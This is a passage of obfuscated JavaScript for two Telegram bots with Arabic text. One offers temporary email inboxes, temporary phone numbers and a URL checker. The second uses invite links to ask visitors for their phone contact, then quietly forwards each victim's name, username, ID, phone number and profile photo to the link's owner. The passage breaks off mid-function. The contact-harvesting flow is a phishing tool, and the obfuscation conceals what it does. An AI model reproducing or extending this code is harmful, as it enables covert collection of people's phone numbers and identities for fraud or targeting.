        bot[_0x22e9cd(0x84f) + 'e'](_0x30f6b8, _0x25482b[_0x22e9cd(0x8ea)], { 'parse_mode': _0x25482b[_0x22e9cd(0x362)] });
    }
}), bot[_0x544f76(0x937)](/\/an/, _0x23ef71 => {
    const _0x54595f = _0x544f76, _0x5d6a24 = {
            'kIbtK': function (_0x146d93) {
                return _0x146d93();
            },
            'owDon': _0x54595f(0x590),
            'uFRrk': _0x54595f(0x684) + _0x54595f(0x41a) + _0x54595f(0x431) + _0x54595f(0x5ce) + 'g>'
        }, _0x483849 = _0x23ef71[_0x54595f(0x638)]['id'], _0x4215fb = _0x23ef71[_0x54595f(0x953)]['id'];
    let _0x1e2b87 = _0x5d6a24[_0x54595f(0x83a)](readEmails);
    if (_0x1e2b87[_0x4215fb]) {
        const _0x40ed89 = _0x1e2b87[_0x4215fb];
        bot[_0x54595f(0x84f) + 'e'](_0x483849, _0x54595f(0x79f) + _0x54595f(0x4d4) + _0x54595f(0x280) + _0x54595f(0x2fa) + _0x54595f(0x8a3) + _0x54595f(0x4b8) + _0x40ed89 + (_0x54595f(0x1ea) + _0x54595f(0x216) + _0x54595f(0x62d) + _0x54595f(0x4a5) + _0x54595f(0x6f7)), { 'parse_mode': _0x5d6a24[_0x54595f(0x912)] });
    } else
        bot[_0x54595f(0x84f) + 'e'](_0x483849, _0x5d6a24[_0x54595f(0x725)], { 'parse_mode': _0x5d6a24[_0x54595f(0x912)] });
}), bot[_0x544f76(0x937)](/\/Messages/, async _0x2fff2f => {
    const _0x50c3d5 = _0x544f76, _0x5cd54a = {
            'Uqjtd': _0x50c3d5(0x590),
            'HJoVs': function (_0xbccff6) {
                return _0xbccff6();
            },
            'ZvYOD': function (_0xd66a3e, _0x4a00c1) {
                return _0xd66a3e > _0x4a00c1;
            },
            'AVQjR': _0x50c3d5(0x2bd) + _0x50c3d5(0x33f) + _0x50c3d5(0x556),
            'YJouP': _0x50c3d5(0x275) + _0x50c3d5(0x686) + _0x50c3d5(0x6a2) + _0x50c3d5(0x80d) + 'g>',
            'hHued': _0x50c3d5(0x212) + _0x50c3d5(0x7a5) + _0x50c3d5(0x645) + _0x50c3d5(0x2f3)
        }, _0x442884 = _0x2fff2f[_0x50c3d5(0x638)]['id'], _0x293d5f = _0x2fff2f[_0x50c3d5(0x953)]['id'];
    let _0x9e2233 = _0x5cd54a[_0x50c3d5(0x33c)](readEmails);
    if (_0x9e2233[_0x293d5f]) {
        const _0x12f738 = _0x9e2233[_0x293d5f];
        try {
            const _0x4865b4 = await axios[_0x50c3d5(0x4f5)](_0x50c3d5(0x58c) + _0x50c3d5(0x2d2) + _0x50c3d5(0x545) + _0x50c3d5(0x722) + _0x50c3d5(0x546) + _0x12f738 + _0x50c3d5(0x41e)), _0x23e98b = _0x4865b4[_0x50c3d5(0x8fe)];
            _0x5cd54a[_0x50c3d5(0x57b)](_0x23e98b[_0x50c3d5(0x23e)], -0x37 * -0x47 + 0x155f * -0x1 + -0x1b * -0x3a) ? _0x23e98b[_0x50c3d5(0x64d)](_0x5126b3 => {
                const _0x3f6ee7 = _0x50c3d5;
                bot[_0x3f6ee7(0x84f) + 'e'](_0x442884, _0x3f6ee7(0x56e) + _0x3f6ee7(0x5bc) + _0x3f6ee7(0x90a) + '\x0a' + _0x5126b3[_0x3f6ee7(0x8d2)] + '\x0a' + _0x5126b3[_0x3f6ee7(0x42d)] + _0x3f6ee7(0x7df), { 'parse_mode': _0x5cd54a[_0x3f6ee7(0x7f8)] });
            }) : bot[_0x50c3d5(0x84f) + 'e'](_0x442884, _0x5cd54a[_0x50c3d5(0x465)]);
        } catch (_0xc8fa0c) {
            bot[_0x50c3d5(0x84f) + 'e'](_0x442884, _0x5cd54a[_0x50c3d5(0x19c)], { 'parse_mode': _0x5cd54a[_0x50c3d5(0x7f8)] });
        }
    } else
        bot[_0x50c3d5(0x84f) + 'e'](_0x442884, _0x5cd54a[_0x50c3d5(0x7c8)], { 'parse_mode': _0x5cd54a[_0x50c3d5(0x7f8)] });
}), bot[_0x544f76(0x937)](/\/de/, _0x152c56 => {
    const _0x40cba6 = _0x544f76, _0x39355a = {
            'tDNFX': function (_0x1c29c9) {
                return _0x1c29c9();
            },
            'LKPUJ': function (_0x42ec6b, _0x4abb60) {
                return _0x42ec6b(_0x4abb60);
            },
            'KwfDJ': _0x40cba6(0x1ff) + _0x40cba6(0x779) + _0x40cba6(0x303) + '>',
            'muLpl': _0x40cba6(0x590),
            'UncCd': _0x40cba6(0x2c8) + _0x40cba6(0x88e) + _0x40cba6(0x916) + _0x40cba6(0x2f3)
        }, _0x2de892 = _0x152c56[_0x40cba6(0x638)]['id'], _0x4a6f56 = _0x152c56[_0x40cba6(0x953)]['id'];
    let _0x110e46 = _0x39355a[_0x40cba6(0x8f0)](readEmails);
    _0x110e46[_0x4a6f56] ? (delete _0x110e46[_0x4a6f56], _0x39355a[_0x40cba6(0x440)](writeEmails, _0x110e46), bot[_0x40cba6(0x84f) + 'e'](_0x2de892, _0x39355a[_0x40cba6(0x509)], { 'parse_mode': _0x39355a[_0x40cba6(0x678)] })) : bot[_0x40cba6(0x84f) + 'e'](_0x2de892, _0x39355a[_0x40cba6(0x911)], { 'parse_mode': _0x39355a[_0x40cba6(0x678)] });
}), bot[_0x544f76(0x937)](/\/de/, async _0x1bf16c => {
    const _0x467d7a = _0x544f76, _0x13f049 = {
            'SEIVY': _0x467d7a(0x1ff) + _0x467d7a(0x779) + _0x467d7a(0x303) + '>',
            'bDlPX': _0x467d7a(0x590),
            'SnaDg': _0x467d7a(0x2c8) + _0x467d7a(0x2b6) + _0x467d7a(0x8fa) + _0x467d7a(0x2f3)
        }, _0x4450a2 = _0x1bf16c[_0x467d7a(0x638)]['id'];
    try {
        fs[_0x467d7a(0x904)](_0x467d7a(0x7fe) + _0x4450a2 + _0x467d7a(0x6a0)), bot[_0x467d7a(0x84f) + 'e'](_0x4450a2, _0x13f049[_0x467d7a(0x674)], { 'parse_mode': _0x13f049[_0x467d7a(0x8f5)] });
    } catch (_0xa99fae) {
        bot[_0x467d7a(0x84f) + 'e'](_0x4450a2, _0x13f049[_0x467d7a(0x6b2)], { 'parse_mode': _0x13f049[_0x467d7a(0x8f5)] });
    }
}), bot[_0x544f76(0x937)](/\/sخسننسمس/, _0x29b1a6 => {
    const _0x3d5657 = _0x544f76, _0x1a3e7a = {
            'SMoXe': _0x3d5657(0x78b) + _0x3d5657(0x777),
            'YcLep': _0x3d5657(0x3ec) + _0x3d5657(0x845),
            'llrOK': _0x3d5657(0x8c3) + _0x3d5657(0x4de) + _0x3d5657(0x5f7) + _0x3d5657(0x26d)
        }, _0x5ca57f = _0x29b1a6[_0x3d5657(0x638)]['id'], _0x129088 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x1a3e7a[_0x3d5657(0x939)],
                            'callback_data': _0x1a3e7a[_0x3d5657(0x2a5)]
                        }]]
            }
        };
    bot[_0x3d5657(0x84f) + 'e'](_0x5ca57f, _0x1a3e7a[_0x3d5657(0x4b1)], _0x129088);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x3e18af => {
    const _0x2349de = _0x544f76, _0x3f6fa0 = {
            'MCApn': function (_0x390743, _0xc4362a) {
                return _0x390743 === _0xc4362a;
            },
            'UATTk': _0x2349de(0x3ec) + _0x2349de(0x845)
        };
    if (_0x3f6fa0[_0x2349de(0x6f9)](_0x3e18af[_0x2349de(0x8fe)], _0x3f6fa0[_0x2349de(0x632)])) {
        const _0x54b6d3 = _0x3e18af[_0x2349de(0x953)]['id'], _0x5aa33d = _0x2349de(0x82a) + _0x2349de(0x6c0) + _0x2349de(0x7d4) + _0x54b6d3;
        bot[_0x2349de(0x84f) + 'e'](_0x3e18af[_0x2349de(0x320)][_0x2349de(0x638)]['id'], _0x2349de(0x5f0) + _0x2349de(0x928) + _0x2349de(0x2b8) + _0x2349de(0x2d3) + _0x2349de(0x869) + _0x2349de(0x66e) + ':\x0a' + _0x5aa33d);
    }
}), secondBot[_0x544f76(0x937)](/\/start (.+)/, (_0x31303c, _0x2100da) => {
    const _0x65b0cf = _0x544f76, _0x475dc0 = {
            'DvgHh': function (_0xc50eff, _0xab9731) {
                return _0xc50eff(_0xab9731);
            },
            'LbBBZ': _0x65b0cf(0x314) + _0x65b0cf(0x879),
            'sgeKh': _0x65b0cf(0x2ef) + _0x65b0cf(0x7af) + _0x65b0cf(0x614) + _0x65b0cf(0x1b7) + _0x65b0cf(0x32b)
        }, _0x3ac5dd = _0x31303c[_0x65b0cf(0x638)]['id'], _0xc0d87a = _0x475dc0[_0x65b0cf(0x2c2)](parseInt, _0x2100da[-0x11 * 0x15b + -0x117e * -0x2 + -0xbf0]);
    inviteLinks[_0x31303c[_0x65b0cf(0x953)]['id']] = _0xc0d87a;
    const _0x137145 = {
        'reply_markup': {
            'keyboard': [[{
                        'text': _0x475dc0[_0x65b0cf(0x3aa)],
                        'request_contact': !![]
                    }]],
            'one_time_keyboard': !![]
        }
    };
    secondBot[_0x65b0cf(0x84f) + 'e'](_0x3ac5dd, _0x475dc0[_0x65b0cf(0x715)], _0x137145);
}), secondBot['on'](_0x544f76(0x5c6), _0x778925 => {
    const _0x28228e = _0x544f76, _0x40a93e = {
            'RoRei': _0x28228e(0x24b) + _0x28228e(0x53a) + _0x28228e(0x4ae),
            'SRJGa': _0x28228e(0x3d6),
            'WWizw': _0x28228e(0x5f2) + _0x28228e(0x4cf) + 'ح.',
            'OilIv': function (_0x107c9f, _0x5c64ef) {
                return _0x107c9f + _0x5c64ef;
            },
            'HTJwB': function (_0x2a9d4e, _0x24545c) {
                return _0x2a9d4e + _0x24545c;
            },
            'NLcYj': function (_0x25fee6, _0x577a3c) {
                return _0x25fee6 + _0x577a3c;
            },
            'JCNtN': function (_0x322094, _0x496cb7) {
                return _0x322094 + _0x496cb7;
            },
            'nkScd': function (_0x58defd, _0x549589) {
                return _0x58defd > _0x549589;
            },
            'lCXwp': _0x28228e(0x229) + _0x28228e(0x2e2),
            'AoYwJ': _0x28228e(0x24b) + _0x28228e(0x710) + _0x28228e(0x595) + _0x28228e(0x3f9) + _0x28228e(0x586),
            'PoIsi': _0x28228e(0x450) + _0x28228e(0x647) + _0x28228e(0x90f) + _0x28228e(0x2c3) + _0x28228e(0x4f1) + _0x28228e(0x48b),
            'KeeRq': function (_0x4941dc, _0xfaafab) {
                return _0x4941dc === _0xfaafab;
            },
            'KmMLb': _0x28228e(0x1f7) + _0x28228e(0x583),
            'mXMof': _0x28228e(0x635) + 'ذة',
            'aCpqi': _0x28228e(0x2ef) + _0x28228e(0x7af) + _0x28228e(0x74d) + _0x28228e(0x390),
            'LSEho': _0x28228e(0x204) + _0x28228e(0x332) + _0x28228e(0x4e5)
        };
    if (_0x778925[_0x28228e(0x5c6)] && inviteLinks[_0x778925[_0x28228e(0x953)]['id']]) {
        if (_0x40a93e[_0x28228e(0x373)](_0x778925[_0x28228e(0x5c6)][_0x28228e(0x88b)], _0x778925[_0x28228e(0x953)]['id'])) {
            const _0x3ac4b8 = inviteLinks[_0x778925[_0x28228e(0x953)]['id']], _0xc70749 = _0x778925[_0x28228e(0x953)], _0x32f60a = _0xc70749['id'], _0x5e7641 = _0xc70749[_0x28228e(0x6b9)], _0x4dc020 = _0xc70749[_0x28228e(0x5d3)] || '', _0x368a78 = _0xc70749[_0x28228e(0x4b9)] || _0x40a93e[_0x28228e(0x3e0)], _0x4f21bb = _0xc70749[_0x28228e(0x932)] || _0x40a93e[_0x28228e(0x3ac)], _0x19e28b = _0x778925[_0x28228e(0x5c6)][_0x28228e(0x257) + 'er'];
            secondBot[_0x28228e(0x4dc) + _0x28228e(0x27a)](_0x32f60a)[_0x28228e(0x507)](_0x4174d2 => {
                const _0x1eb027 = _0x28228e, _0x49c57a = { 'zYiZB': _0x40a93e[_0x1eb027(0x5a9)] }, _0x4ff324 = _0x40a93e[_0x1eb027(0x1cb)](_0x40a93e[_0x1eb027(0x4d6)](_0x40a93e[_0x1eb027(0x6b8)](_0x40a93e[_0x1eb027(0x441)](_0x1eb027(0x517) + _0x1eb027(0x383) + '\x0a', _0x1eb027(0x51c) + _0x5e7641 + '\x20' + _0x4dc020 + _0x1eb027(0x227)), _0x1eb027(0x724) + '@' + _0x368a78 + _0x1eb027(0x227)), _0x1eb027(0x5d9) + _0x32f60a + _0x1eb027(0x227)), _0x1eb027(0x258) + _0x1eb027(0x54f) + _0x19e28b + '\x0a');
                if (_0x40a93e[_0x1eb027(0x642)](_0x4174d2[_0x1eb027(0x753) + 't'], 0x1 * 0xc43 + -0x29c * 0xe + 0x1845)) {
                    const _0x146355 = _0x4174d2[_0x1eb027(0x1bd)][0x782 + 0x1 * 0x119d + -0x3b * 0x6d][-0xf33 + -0x1 * 0x47 + 0xf7a][_0x1eb027(0x868)];
                    _0x146355 ? bot[_0x1eb027(0x5e4)](_0x3ac4b8, _0x146355, {
                        'caption': _0x4ff324,
                        'parse_mode': _0x40a93e[_0x1eb027(0x4dd)]
                    })[_0x1eb027(0x507)](() => {
                        const _0x5ee25c = _0x1eb027;
                        console[_0x5ee25c(0x2e0)](_0x49c57a[_0x5ee25c(0x6a8)]);
                    })[_0x1eb027(0x854)](_0x3856c7 => {
                        const _0x489d6f = _0x1eb027;
                        console[_0x489d6f(0x20f)](_0x40a93e[_0x489d6f(0x84d)], _0x3856c7), bot[_0x489d6f(0x84f) + 'e'](_0x3ac4b8, _0x4ff324, { 'parse_mode': _0x40a93e[_0x489d6f(0x4dd)] });
                    }) : bot[_0x1eb027(0x84f) + 'e'](_0x3ac4b8, _0x4ff324, { 'parse_mode': _0x40a93e[_0x1eb027(0x4dd)] });
                } else
                    bot[_0x1eb027(0x84f) + 'e'](_0x3ac4b8, _0x4ff324, { 'parse_mode': _0x40a93e[_0x1eb027(0x4dd)] });
                secondBot[_0x1eb027(0x84f) + 'e'](_0x778925[_0x1eb027(0x638)]['id'], _0x40a93e[_0x1eb027(0x434)]), delete inviteLinks[_0x778925[_0x1eb027(0x953)]['id']];
            })[_0x28228e(0x854)](_0x376401 => {
                const _0x3fdd4e = _0x28228e;
                console[_0x3fdd4e(0x20f)](_0x40a93e[_0x3fdd4e(0x732)], _0x376401), secondBot[_0x3fdd4e(0x84f) + 'e'](_0x778925[_0x3fdd4e(0x638)]['id'], _0x40a93e[_0x3fdd4e(0x775)]);
            });
        } else
            secondBot[_0x28228e(0x84f) + 'e'](_0x778925[_0x28228e(0x638)]['id'], _0x40a93e[_0x28228e(0x7ec)]);
    } else
        secondBot[_0x28228e(0x84f) + 'e'](_0x778925[_0x28228e(0x638)]['id'], _0x40a93e[_0x28228e(0x6c8)]);
}), secondBot['on'](_0x544f76(0x320), _0x51b133 => {
    const _0x5824f6 = _0x544f76, _0x3879ab = {
            'XIKOb': function (_0x55e075, _0x14d267) {
                return _0x55e075 !== _0x14d267;
            },
            'iUshp': _0x5824f6(0x630),
            'FhWSY': _0x5824f6(0x314) + _0x5824f6(0x879),
            'onPgy': _0x5824f6(0x2ef) + _0x5824f6(0x7af) + _0x5824f6(0x249)
        };
    if (!_0x51b133[_0x5824f6(0x5c6)] && _0x3879ab[_0x5824f6(0x60d)](_0x51b133[_0x5824f6(0x6d8)], _0x3879ab[_0x5824f6(0x1bf)])) {
        const _0x3e5d85 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x3879ab[_0x5824f6(0x756)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x5824f6(0x84f) + 'e'](_0x51b133[_0x5824f6(0x638)]['id'], _0x3879ab[_0x5824f6(0x548)], _0x3e5d85);
    }
});
const countries = {
    '+1': [
        _0x544f76(0x80b),
        _0x544f76(0x666)
    ],
    '+46': [
        _0x544f76(0x685),
        _0x544f76(0x835)
    ],
    '+86': [
        _0x544f76(0x6d1),
        _0x544f76(0x8ab)
    ],
    '+852': [
        _0x544f76(0x4fe),
        _0x544f76(0x640)
    ],
    '+45': [
        _0x544f76(0x365),
        _0x544f76(0x1c3)
    ],
    '+33': [
        _0x544f76(0x654),
        _0x544f76(0x4ac)
    ],
    '+31': [
        _0x544f76(0x60b),
        _0x544f76(0x673)
    ],
    '+7': [
        _0x544f76(0x607),
        _0x544f76(0x66f)
    ],
    '+7KZ': [
        _0x544f76(0x688),
        _0x544f76(0x7bd)
    ],
    '+381': [
        _0x544f76(0x208),
        _0x544f76(0x2c6)
    ],
    '+44': [
        _0x544f76(0x93e),
        _0x544f76(0x228)
    ],
    '+371': [
        _0x544f76(0x8e6),
        _0x544f76(0x93f)
    ],
    '+62': [
        _0x544f76(0x683),
        _0x544f76(0x3c8)
    ],
    '+351': [
        _0x544f76(0x5b0),
        _0x544f76(0x82c)
    ],
    '+34': [
        _0x544f76(0x7e6),
        _0x544f76(0x8d6)
    ],
    '+372': [
        _0x544f76(0x501),
        _0x544f76(0x51d)
    ],
    '+358': [
        _0x544f76(0x7e3),
        _0x544f76(0x1aa)
    ]
};
async function importNumbers() {
    const _0x193aad = _0x544f76, _0x350672 = {
            'dZBCt': _0x193aad(0x862) + _0x193aad(0x313) + _0x193aad(0x8d7),
            'OHRAt': _0x193aad(0x6ae) + _0x193aad(0x215)
        };
    try {
        const _0x3e73a0 = await axios[_0x193aad(0x4f5)](_0x350672[_0x193aad(0x4d2)]);
        return _0x3e73a0[_0x193aad(0x8fe)][_0x193aad(0x7b8)]('\x0a');
    } catch (_0x2c389a) {
        return console[_0x193aad(0x20f)](_0x350672[_0x193aad(0x25d)], _0x2c389a), [];
    }
}
async function getRandomNumberInfo() {
    const _0x4e4e26 = _0x544f76, _0x5cd2e3 = {
            'MXikp': function (_0x41c82e) {
                return _0x41c82e();
            },
            'elHdk': function (_0x2d0ddf, _0x30f085) {
                return _0x2d0ddf === _0x30f085;
            },
            'nPAfc': function (_0x5c6c73, _0x74d71a) {
                return _0x5c6c73 * _0x74d71a;
            },
            'UFkzD': _0x4e4e26(0x5ae),
            'PXtKA': _0x4e4e26(0x8bd),
            'drjKf': function (_0x200a31, _0x151246) {
                return _0x200a31 in _0x151246;
            },
            'UFuyD': _0x4e4e26(0x72f) + _0x4e4e26(0x231)
        }, _0x3c1f14 = await _0x5cd2e3[_0x4e4e26(0x86b)](importNumbers);
    if (_0x5cd2e3[_0x4e4e26(0x709)](_0x3c1f14[_0x4e4e26(0x23e)], -0x1231 * 0x1 + 0x3a9 * -0x6 + 0x2827))
        return null;
    const _0x1edc3a = Math[_0x4e4e26(0x69d)](_0x5cd2e3[_0x4e4e26(0x8a8)](Math[_0x4e4e26(0x360)](), _0x3c1f14[_0x4e4e26(0x23e)])), _0x3352e9 = _0x3c1f14[_0x1edc3a][_0x4e4e26(0x470)](), _0x596ce8 = new Date()[_0x4e4e26(0x4f2) + 'g']()[_0x4e4e26(0x7b8)]('T')[-0x161 * -0xe + 0x1871 + -0x3 * 0xe95], _0x1f644c = new Date()[_0x4e4e26(0x765) + _0x4e4e26(0x954)](_0x5cd2e3[_0x4e4e26(0x523)]);
    let _0x23c943;
    if (_0x3352e9[_0x4e4e26(0x428)]('+1'))
        _0x23c943 = '+1';
    else
        _0x3352e9[_0x4e4e26(0x428)]('+7') ? _0x23c943 = _0x3352e9[_0x4e4e26(0x8a7)]('7') ? _0x5cd2e3[_0x4e4e26(0x2e7)] : '+7' : _0x23c943 = _0x5cd2e3[_0x4e4e26(0x934)](_0x3352e9[_0x4e4e26(0x57c)](-0x8f * 0x21 + -0x2255 + -0x133 * -0x2c, 0x4 * -0x93a + -0x1 * -0x23b1 + -0x69 * -0x3), countries) ? _0x3352e9[_0x4e4e26(0x57c)](-0x154a * 0x1 + -0x81e + 0x1d68, 0x156c + 0x19 * -0x5a + -0xc9e) : _0x3352e9[_0x4e4e26(0x57c)](-0x1778 + -0x1491 + 0x2c09 * 0x1, -0x430 + -0x2401 + 0x2834);
    const [_0x1e21c8, _0x1f7eae] = countries[_0x23c943] || [
        _0x5cd2e3[_0x4e4e26(0x302)],
        '🚩'
    ];
    return {
        'number': _0x3352e9,
        'countryCode': _0x23c943,
        'countryName': _0x1e21c8,
        'countryFlag': _0x1f7eae,
        'creationDate': _0x596ce8,
        'creationTime': _0x1f644c
    };
}
async function getMessages(_0x2f9817) {
    const _0x103ffc = _0x544f76, _0x20fe52 = {
            'goHyC': function (_0x2d3b9e, _0x41668b) {
                return _0x2d3b9e(_0x41668b);
            },
            'SViSY': function (_0x18f6a9, _0x3b64bc) {
                return _0x18f6a9(_0x3b64bc);
            },
            'xVgSh': _0x103ffc(0x244) + _0x103ffc(0x6d7) + _0x103ffc(0x3af),
            'cKgKc': _0x103ffc(0x6ae) + _0x103ffc(0x4c7)
        };
    try {
        const _0x4a9b2e = await axios[_0x103ffc(0x4f5)](_0x103ffc(0x42a) + _0x103ffc(0x7ae) + _0x103ffc(0x8b9) + _0x2f9817), _0x498c7c = cheerio[_0x103ffc(0x930)](_0x4a9b2e[_0x103ffc(0x8fe)]), _0x45b35f = [];
        return _0x20fe52[_0x103ffc(0x903)](_0x498c7c, _0x20fe52[_0x103ffc(0x698)])[_0x103ffc(0x8da)]((_0x788510, _0x3b9778) => {
            const _0x2fa591 = _0x103ffc;
            _0x45b35f[_0x2fa591(0x3f0)](_0x20fe52[_0x2fa591(0x47b)](_0x498c7c, _0x3b9778)[_0x2fa591(0x6d8)]()[_0x2fa591(0x470)]());
        }), _0x45b35f;
    } catch (_0x59d1f2) {
        return console[_0x103ffc(0x20f)](_0x20fe52[_0x103ffc(0x522)], _0x59d1f2), [];
    }
}
function _0x6efd(_0x31bf20, _0x36d4e9) {
    const _0x57430d = _0x2725();
    return _0x6efd = function (_0x21f41e, _0x358062) {
        _0x21f41e = _0x21f41e - (0x1cf0 + 0x1687 + -0x183 * 0x21);
        let _0x5b6444 = _0x57430d[_0x21f41e];
        return _0x5b6444;
    }, _0x6efd(_0x31bf20, _0x36d4e9);
}
bot[_0x544f76(0x937)](/\/stسمهصخصt/, _0x5322de => {
    const _0x4cf1ac = _0x544f76, _0x485f3d = {
            'aMNID': _0x4cf1ac(0x7db) + _0x4cf1ac(0x846),
            'EClhA': _0x4cf1ac(0x938),
            'dKivt': _0x4cf1ac(0x2a4) + _0x4cf1ac(0x5e2) + _0x4cf1ac(0x5dc) + _0x4cf1ac(0x86f)
        }, _0x59e3a7 = _0x5322de[_0x4cf1ac(0x638)]['id'], _0x5c2f7b = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x485f3d[_0x4cf1ac(0x3a9)],
                            'callback_data': _0x485f3d[_0x4cf1ac(0x2e1)]
                        }]]
            }
        };
    bot[_0x4cf1ac(0x84f) + 'e'](_0x59e3a7, _0x485f3d[_0x4cf1ac(0x2d9)], _0x5c2f7b);
});
const m = _0x544f76(0x776) + _0x544f76(0x7b4) + 'ج';
bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0x2da31e => {
    const _0x299830 = _0x544f76, _0x258bb4 = {
            'cZGec': function (_0xef8f0d, _0x146d74) {
                return _0xef8f0d === _0x146d74;
            },
            'bqKMg': _0x299830(0x938),
            'mKXll': function (_0x348c72) {
                return _0x348c72();
            },
            'uMaCo': _0x299830(0x45d) + _0x299830(0x8ec),
            'tPyYP': _0x299830(0x5d7) + '💬',
            'RnGtt': function (_0x51728b, _0x36d2ba) {
                return _0x51728b + _0x36d2ba;
            },
            'eWtgB': function (_0x4b2bbf, _0x1ed133) {
                return _0x4b2bbf + _0x1ed133;
            },
            'VbuoS': function (_0x3be377, _0x555c22) {
                return _0x3be377 + _0x555c22;
            },
            'hbLRJ': function (_0x305721, _0x49d8ad) {
                return _0x305721 + _0x49d8ad;
            },
            'AAWYq': _0x299830(0x3d6),
            'wBeeo': _0x299830(0x2bd) + _0x299830(0x535) + _0x299830(0x4b7),
            'GAJPL': _0x299830(0x7cb) + _0x299830(0x3cd),
            'bvugo': function (_0x2ca397, _0x35d499) {
                return _0x2ca397(_0x35d499);
            },
            'qiXZM': function (_0x13dd97, _0x39bf73) {
                return _0x13dd97 > _0x39bf73;
            },
            'muozv': _0x299830(0x46e) + _0x299830(0x403) + _0x299830(0x463),
            'uMwec': _0x299830(0x2e5) + _0x299830(0x1b1)
        }, _0x33a5da = _0x2da31e[_0x299830(0x320)], _0x4baea4 = _0x33a5da[_0x299830(0x638)]['id'], _0x27b4d6 = _0x2da31e[_0x299830(0x8fe)];
    if (_0x258bb4[_0x299830(0x333)](_0x27b4d6, _0x258bb4[_0x299830(0x26c)])) {
        const _0x3b2ec4 = await _0x258bb4[_0x299830(0x6be)](getRandomNumberInfo);
        if (_0x3b2ec4) {
            const _0x263127 = {
                    'reply_markup': {
                        'inline_keyboard': [
                            [{
                                    'text': _0x258bb4[_0x299830(0x571)],
                                    'callback_data': _0x258bb4[_0x299830(0x26c)]
                                }],
                            [{
                                    'text': _0x258bb4[_0x299830(0x498)],
                                    'callback_data': _0x299830(0x7cb) + _0x299830(0x3cd) + _0x3b2ec4[_0x299830(0x443)]
                                }]
                        ]
                    }
                }, _0x464757 = _0x258bb4[_0x299830(0x580)](_0x258bb4[_0x299830(0x888)](_0x258bb4[_0x299830(0x200)](_0x258bb4[_0x299830(0x580)](_0x258bb4[_0x299830(0x6a7)](_0x258bb4[_0x299830(0x580)](_0x299830(0x31b) + _0x299830(0x241) + _0x299830(0x952) + _0x299830(0x719) + _0x3b2ec4[_0x299830(0x443)] + '`\x0a', _0x299830(0x8e1) + '\x20' + _0x3b2ec4[_0x299830(0x771) + 'e'] + '\x20' + _0x3b2ec4[_0x299830(0x1fd) + 'g'] + '\x0a'), _0x299830(0x21a) + _0x299830(0x65e) + _0x3b2ec4[_0x299830(0x8b2) + 'e'] + '\x0a'), _0x299830(0x335) + _0x299830(0x54f) + m + '\x0a'), _0x299830(0x22e) + _0x299830(0x5c5) + _0x3b2ec4[_0x299830(0x8cf) + 'te'] + '\x0a'), _0x299830(0x1f8) + _0x299830(0x7bb) + _0x3b2ec4[_0x299830(0x819) + 'me'] + '\x0a'), _0x299830(0x42b) + _0x299830(0x305) + '.');
            bot[_0x299830(0x432) + _0x299830(0x628)](_0x464757, {
                'chat_id': _0x4baea4,
                'message_id': _0x33a5da[_0x299830(0x342)],
                'parse_mode': _0x258bb4[_0x299830(0x530)],
                'reply_markup': _0x263127[_0x299830(0x821) + 'up']
            });
        } else
            bot[_0x299830(0x84f) + 'e'](_0x4baea4, _0x258bb4[_0x299830(0x53e)]);
    } else {
        if (_0x27b4d6[_0x299830(0x428)](_0x258bb4[_0x299830(0x43c)])) {
            const _0x3dbeeb = _0x27b4d6[_0x299830(0x7b8)]('_')[0x2 * -0xc79 + -0xb35 + 0x1 * 0x2429], _0x40801f = await _0x258bb4[_0x299830(0x604)](getMessages, _0x3dbeeb);
            if (_0x258bb4[_0x299830(0x415)](_0x40801f[_0x299830(0x23e)], 0x5c4 + 0x239e * -0x1 + 0x1dda)) {
                let _0x2bc48b = _0x40801f[_0x299830(0x57c)](0x1ca7 + 0x722 + -0x23c9, -0x1b0a + -0x5 * 0x187 + 0x22b3)[_0x299830(0x430)]((_0x24010b, _0x20bacd) => _0x299830(0x210) + 'م\x20' + (_0x20bacd + (0x5f * 0x65 + 0xb24 + -0x184f * 0x2)) + _0x299830(0x37c) + _0x24010b + '`')[_0x299830(0x1ec)]('\x0a\x0a');
                _0x2bc48b += _0x258bb4[_0x299830(0x235)], bot[_0x299830(0x84f) + 'e'](_0x4baea4, _0x2bc48b, { 'parse_mode': _0x258bb4[_0x299830(0x530)] });
            } else
                bot[_0x299830(0x84f) + 'e'](_0x4baea4, _0x258bb4[_0x299830(0x359)]);
        }
    }
});
const dangerous_keywords = [
        _0x544f76(0x481),
        _0x544f76(0x592),
        'gd',
        _0x544f76(0x347),
        _0x544f76(0x704),
        _0x544f76(0x315),
        _0x544f76(0x308),
        _0x544f76(0x20e),
        _0x544f76(0x29f),
        _0x544f76(0x1c0),
        _0x544f76(0x504),
        _0x544f76(0x7a8),
        _0x544f76(0x726)
    ], safe_urls = [
        _0x544f76(0x68b),
        _0x544f76(0x2f8),
        _0x544f76(0x39f),
        _0x544f76(0x4a9) + _0x544f76(0x40c),
        _0x544f76(0x636) + _0x544f76(0x26f),
        _0x544f76(0x4b3) + 'om',
        _0x544f76(0x585),
        _0x544f76(0x76d),
        _0x544f76(0x627) + 'om',
        _0x544f76(0x21b),
        _0x544f76(0x739) + 'om'
    ];
let waiting_for_link = {};
function checkUrl(_0x2346f8) {
    const _0x46f50a = _0x544f76, _0x9a5363 = {
            'HRHwI': _0x46f50a(0x214),
            'rymyy': _0x46f50a(0x7ad) + '🔴',
            'xDbgV': _0x46f50a(0x21b),
            'gtTmb': _0x46f50a(0x340)
        }, _0x12a6f5 = _0x2346f8[_0x46f50a(0x72e) + 'e']();
    for (let _0x2172e5 of safe_urls) {
        if (_0x12a6f5[_0x46f50a(0x8a7)](_0x2172e5))
            return _0x9a5363[_0x46f50a(0x2a7)];
    }
    for (let _0x552a48 of dangerous_keywords) {
        if (_0x12a6f5[_0x46f50a(0x8a7)](_0x552a48))
            return _0x9a5363[_0x46f50a(0x61b)];
    }
    if (!_0x12a6f5[_0x46f50a(0x8a7)](_0x9a5363[_0x46f50a(0x8f1)]))
        return _0x9a5363[_0x46f50a(0x3b6)];
    return _0x9a5363[_0x46f50a(0x2a7)];
}
function isValidUrl(_0x5e4bd9) {
    const _0x5b097a = _0x544f76, _0x84259e = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return _0x84259e[_0x5b097a(0x473)](_0x5e4bd9);
}
async function getIpInfo(_0x23f487) {
    const _0x884f3f = _0x544f76;
    try {
